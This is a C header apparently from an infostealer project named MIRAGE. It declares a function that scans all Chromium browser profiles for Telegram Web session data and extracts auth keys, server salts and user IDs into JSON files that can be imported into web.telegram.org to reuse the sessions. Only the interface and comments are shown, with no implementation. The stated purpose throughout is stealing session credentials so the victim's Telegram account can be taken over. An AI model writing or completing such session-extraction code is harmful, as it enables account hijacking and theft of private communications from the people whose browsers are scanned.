/*
 * telegram_web.h — Telegram Web session extraction.
 *
 * Extracts Telegram Web sessions from Chromium Local Storage LevelDB files.
 * Scans all Chromium profiles for web.telegram.org auth keys.
 * Writes JSON import files compatible with web.telegram.org/k/.
 *
 * Guarded by #ifdef ENABLE_TELEGRAM.
 */
#ifndef MIRAGE_TELEGRAM_WEB_H
#define MIRAGE_TELEGRAM_WEB_H

#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * collect_telegram_web — Scan all Chromium profiles for Telegram Web
 * sessions stored in Local Storage LevelDB files.
 *
 * Extracts dc1-dc5 auth keys, server salts, userId, and other session
 * data. Writes JSON import files to:
 *   <output_dir>/Telegram_Web/<browser>/<profile>/tg-storage_<account>_<userId>.json
 *
 * Returns number of sessions extracted. 0 if nothing found.
 */
int collect_telegram_web(const char *local_app_data,
                         const char *roaming_app_data,
                         const char *output_dir);

#ifdef __cplusplus
}
#endif

#endif /* MIRAGE_TELEGRAM_WEB_H */
